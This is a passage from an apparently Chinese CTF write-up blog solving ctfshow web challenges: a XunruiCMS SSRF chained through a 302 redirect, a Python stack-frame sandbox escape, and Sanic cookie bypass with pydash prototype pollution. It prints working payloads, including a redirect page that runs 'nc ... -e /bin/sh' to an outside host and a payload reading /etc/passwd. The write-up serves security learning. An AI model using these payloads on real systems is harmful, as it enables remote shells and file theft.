class="comment">--all-databases</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><code>mysqldump</code>: 是MySQL数据库的一个命令行工具，用于导出数据库中的数据为SQL格式的文件，常用于备份数据库或迁移数据</li><li><code>--all-databases</code>: 是一个选项，告诉mysqldump导出所有数据库的数据，包括MySQL服务器上所有的数据库实例</li></ul></blockquote><p><img src="https://img.picui.cn/free/2024/06/04/665ef118ec5e4.png" alt="image-20240529161608701.png"></p><h2 id="easycms（302跳转、迅睿CNVD-C-2022-423202-ssrf）"><a href="#easycms（302跳转、迅睿CNVD-C-2022-423202-ssrf）" class="headerlink" title="easycms（302跳转、迅睿CNVD-C-2022-423202 ssrf）"></a>easycms（302跳转、迅睿CNVD-C-2022-423202 ssrf）</h2><p>hint：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">提示1： /flag.php： </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="built_in">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">提示2：github找一下源码?</span><br></pre></td></tr></table></figure><p>扫目录发现<code>/flag.php</code>、<code>Readme.txt</code>、<code>/install.php</code>第三个没啥用，第二个是乱码，找个在线网站恢复一下：<a href="https://www.ff98sha.me/tools/messycode/">https://www.ff98sha.me/tools/messycode/</a></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">迅睿CMS官方下载地址：https:<span class="comment">//www.xunruicms.com/down/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 安装路径</span><br><span class="line">将网站运行目录（主目录）设置为：public（如果没有就忽略设置）</span><br><span class="line">安装环境监测：/test.php</span><br><span class="line">程序安装地址：/install.php</span><br><span class="line">后台登录地址：/admin****.php（****是随机的）</span><br><span class="line">重置后台地址：https:<span class="comment">//www.xunruicms.com/doc/1097.html</span></span><br><span class="line">首次使用方法：https:<span class="comment">//www.xunruicms.com/doc/631.html</span></span><br><span class="line"></span><br><span class="line">#### 运行环境</span><br><span class="line"></span><br><span class="line">Laravel内� �：PHP8<span class="number">.0</span>及以上</span><br><span class="line">ThinkPHP内� �：PHP7<span class="number">.4</span>及以上</span><br><span class="line">CodeIgniter内� �：PHP7<span class="number">.4</span>及以上</span><br><span class="line">CodeIgniter72内� �：PHP7<span class="number">.2</span>及以上</span><br><span class="line"></span><br><span class="line">MySQL数据库：MySQL5及以上，推荐<span class="number">5.7</span>及以上</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 内� �切换方法</span><br><span class="line">https:<span class="comment">//www.xunruicms.com/doc/1246.html</span></span><br></pre></td></tr></table></figure><p>呃感觉没啥用，去github上下载源码：<a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p><p>hint中flag.php中给到可以rce但必须是本地ip，而且也没给出怎么伪造ip，推测是个ssrf，去<a href="https://www.xunruicms.com/bug/">迅睿官网公示漏洞</a>上看了下相关漏洞，有个ssrf</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef1191b765.png" alt="屏幕截图 2024-05-29 164330.png"></p><p>直接定位到<code>xunruicms-master\dayrui\Fcms\Control\Api\Api.php</code>的<code>qrcode</code>函数，其中<code>thumb</code>参数可控，控制他的函数是<code>dr_catcher_data</code></p><p><img src="https://img.picui.cn/free/2024/06/04/665ef1192539e.png" alt="屏幕截图 2024-05-29 165825.png"></p><p>跟进一下<code>dr_catcher_data</code>函数</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11928eb5.png" alt="屏幕截图 2024-05-29 172257.png"></p><p><code>$ch = curl_init($url);</code></p><blockquote><ul><li><code>curl_init</code> 是PHP的内置函数，用于创建一个新的cURL会话。</li><li><code>$url</code> 是传递给 <code>curl_init</code> 函数的参数，即你希望cURL去访问的URL地址，<code>url</code>的值也就是<code>thumb</code>的值</li></ul></blockquote><p>&#96;&#96;$data &#x3D; curl_exec($ch);&#96;</p><blockquote><ul><li><code>curl_exec</code> 是PHP的cURL函数之一，它的作用是执行一个先前初始化的cURL会话（由<code>$ch</code>句柄表示），发起HTTP或HTTPS请求到在<code>curl_init()</code>中设定的URL地址，也就是我们传入的<code>thumb</code>的值</li></ul></blockquote><p>简单来说就是我们可以控制该环境访问任意一个url，再结合ssrf的常用绕过方式302跳转，就很好打了，先在vps上起个302弹shell的网页，然后thumb传入vps上的网页地址即可</p><p>1.php（ctfshow的靶场用nc可以弹）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=nc%20121.40.195.194%202333%20-e%20%2Fbin%2Fsh&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>迅睿的访问路由格式</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11947896.png" alt="image-20240529173501963.png"></p><p>size、text、level随便传，payload：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=api<span class="variable">&amp;c</span>=api<span class="variable">&amp;m</span>=qrcode<span class="variable">&amp;text</span>=<span class="number">111</span><span class="variable">&amp;size</span>=<span class="number">111</span><span class="variable">&amp;level</span>=<span class="number">1</span><span class="variable">&amp;thumb</span>=http:<span class="comment">//121.40.195.194/1.php</span></span><br></pre></td></tr></table></figure><p>最后&#x2F;readflag得到flag</p><h2 id="mossfern（python利用栈帧进行沙箱逃逸）"><a href="#mossfern（python利用栈帧进行沙箱逃逸）" class="headerlink" title="mossfern（python利用栈帧进行沙箱逃逸）"></a>mossfern（python利用栈帧进行沙箱逃逸）</h2><p>附件给了俩py文件，其中runner.py中有几个函数过滤了一些东西，尝试用栈帧逃逸，ctfshow的环境没有前端，只能传json数据，所以就用python脚本打了，先来个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line">frame = gen.gi_frame</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/04/665ef11946465.png" alt="屏幕截图 2024-05-29 224747.png"></p><p>没被过滤，可以用栈帧，尝试back一下</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">def</span> <span class="function"><span class="title">waff</span>():</span></span><br><span class="line"><span class="function">    <span class="variable">def</span> <span class="title">f</span>():</span></span><br><span class="line"><span class="function">        <span class="variable">yield</span> <span class="variable">g.gi_frame.f_back</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="variable">g</span> = <span class="title">f</span>()</span></span><br><span class="line">    <span class="variable">frame</span> = [<span class="variable">x</span> <span class="variable">for</span> <span class="variable">x</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">g</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="variable">frame</span>)</span></span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="variable">frame.f_back</span>)</span></span><br><span class="line"><span class="function"><span class="title">waff</span>()</span></span><br></pre></td></tr></table></figure><p>这里对获取栈帧对象时用<code>frame = next(g)</code>会报错，应该是有过滤，所以改用<code>frame = [x for x in g][0]</code>生成器，向上back三次就可以逃出沙箱</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11974b41.png" alt="image-20240530193024517.png"></p><p>逃出沙箱后就可以用<code>f_globals</code>来获取全局变量，然后用<code>__builtins__</code>函数加载出其内置函数，再用<code>dir</code>函数就可以打印出其内置函数的具体列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">globals</span> = frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    builtins = <span class="built_in">globals</span>[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line">    <span class="built_in">dir</span> = builtins.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(<span class="built_in">globals</span>))</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure><p>main.py中有一段代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">open</span><span class="params">(f<span class="string">&quot;/app/uploads/&#123;id&#125;.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span></span><span class="selector-class">.write</span>(</span><br><span class="line">            runner<span class="selector-class">.replace</span>(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag)<span class="selector-class">.replace</span>(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, id))</span><br></pre></td></tr></table></figure><p>以上代码的作用是将flag变量替换为了runner文件中的THIS_IS_SEED，导致flag的值成为一个常量，只要我们逃出沙箱后用<code>f_code</code>来得到代码对象再用<code>co_consts</code>属性来查看该代码块中所用到的所有常量，就可以得到THIS_IS_SEED，也就是flag的值</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">def</span> <span class="function"><span class="title">waff</span>():</span></span><br><span class="line"><span class="function">    <span class="variable">def</span> <span class="title">f</span>():</span></span><br><span class="line"><span class="function">        <span class="variable">yield</span> <span class="variable">g.gi_frame.f_back</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="variable">g</span> = <span class="title">f</span>()</span></span><br><span class="line">    <span class="variable">frame</span> = [<span class="variable">x</span> <span class="variable">for</span> <span class="variable">x</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">g</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="variable">code</span> = <span class="variable">frame.f_back.f_back.f_back.f_code</span></span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="variable">code.co_consts</span>)</span></span><br><span class="line"><span class="function"><span class="title">waff</span>()</span></span><br></pre></td></tr></table></figure><p>这样还是不行，因为runner中对输出进行了检测</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">if</span></span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">output</span>:</span><br><span class="line">       <span class="function"><span class="title">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span></span><br><span class="line">       <span class="function"><span class="title">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>我们可以用<code>builtins</code>下的<code>str</code>函数将flag常量转换为字符串然后一个字符一个字符地输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span> = frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    builtins = <span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    flag = frame.f_back.f_back.f_back.f_code.co_consts</span><br><span class="line">    <span class="built_in">str</span> = builtins.<span class="built_in">str</span></span><br><span class="line">    flag = <span class="built_in">str</span>(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/05/66608a929b655.png" alt="屏幕截图 2024-05-30 205426.png"></p><h2 id="sanic（python原型链污染）"><a href="#sanic（python原型链污染）" class="headerlink" title="sanic（python原型链污染）"></a>sanic（python原型链污染）</h2><p><code>/src</code>路由</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>/login</code>路由的源码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/login&quot;)</span><br><span class="line">async def <span class="keyword">login</span>(request):</span><br><span class="line">    <span class="keyword">user</span> = request.cookies.<span class="keyword">get</span>(&quot;user&quot;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">user</span>.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.<span class="keyword">session</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> text(&quot;login success&quot;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(&quot;login fail&quot;)</span><br></pre></td></tr></table></figure><p>需要令cookie中user字段的值为adm;n，如果直接传，sanic会以<code>;</code>截断，跟进sanic的源码，<code>request.py</code>中<code>parse_cookie</code>方法中对于cookie的处理有个匹配规则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COOKIE_NAME_RESERVED_CHARS = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">&#x27;[\x00-\x1f\x7f-\xff()&lt;&gt;@,;:\\\\&quot;/[\\]?=&#123;&#125; \x09]&#x27;</span></span><br><span class="line">)</span><br><span class="line">OCTAL_PATTERN = re.<span class="built_in">compile</span>(<span class="string">r&quot;\\[0-3][0-7][0-7]&quot;</span>)</span><br><span class="line">QUOTE_PATTERN = re.<span class="built_in">compile</span>(<span class="string">r&quot;[\\].&quot;</span>)</span><br></pre></td></tr></table></figure><p>其中<code>OCTAL_PATTERN = re.compile(r&quot;\\[0-3][0-7][0-7]&quot;)</code>用于处理八进制数据，说明我们可用八进制绕，<code>;</code>的八进制是<code>\073</code>，对<code>/login</code>路由传<code>Cookie：user=&quot;adm\073n&quot;</code>，拿到session后就可以登录<code>admin</code>路由了</p><p><code>/src</code>路由最开始给出了pydash&#x3D;&#x3D;5.1.2，而且<code>/admin</code>路由处理传入值时还用到了<code>pydash.set_</code>函数，这个函数可以污染，具体原理见文章：<a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/</a></p><p>跟进下pydash的源码，在pydash这个包中有这样一段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        keys = [</span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unescape_path_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Unescape path key.&quot;&quot;&quot;</span></span><br><span class="line">    key = key.replace(<span class="string">r&quot;\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    key = key.replace(<span class="string">r&quot;\.&quot;</span>, <span class="string">r&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br></pre></td></tr></table></figure><p>其中关键的是<code>unescape_path_key</code>函数，它将路径键中的双反斜杠 (<code>\\</code>) 替换为单反斜杠 (<code>\</code>)，转义点 (<code>\.</code>) 替换为点 (<code>.</code>)，因此可以用<code>_\\\\.</code>来绕过<code>/admin</code>路由中对<code>_.</code>的过滤，其解析过程为：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_<span class="string">\\\\.</span>     -&gt;     _<span class="string">\\\.</span>     -&gt;     _<span class="string">\\.</span>     -&gt;     _<span class="string">\.</span>    -&gt;      _.</span><br></pre></td></tr></table></figure><p>所以可以实现任意文件读取，payload：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;.__init__<span class="subst">\\</span><span class="subst">\\</span>.__globals__<span class="subst">\\</span><span class="subst">\\</span>.__file__&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>然后<code>/src</code>路由就变成了</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef119822fd.png" alt="image-20240602195840269.png"></p><p>ctfshow的靶机<code>/proc/1/environ</code>环境变量就有flag，原本的环境这是没有flag的</p><p>正确做法是污染根目录，开始找污染链，首先看注册路由</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef119a8ff8.png" alt="image-20240603164348956.png"></p><p>跟进<code>static</code>这个方法的源码</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef119ad3a0.png" alt="image-20240603164425285.png"></p><p>其注释中提到</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11ab9090.png" alt="image-20240603164755311.png"></p><p>以上注释的含义是<code>directory_view</code>为True时，会开启列目录功能，默认为false；而<code>directory_handler</code>中可以获取指定的目录，继续往下翻可以看到<code>directory_handler</code></p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11ab8ce5.png" alt="image-20240603165117436.png"></p><p>发现<code>directory_handler</code>其实是调用了DirectoryHandler这个类，跟进这个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DirectoryHandler</span>:</span><br><span class="line">    <span 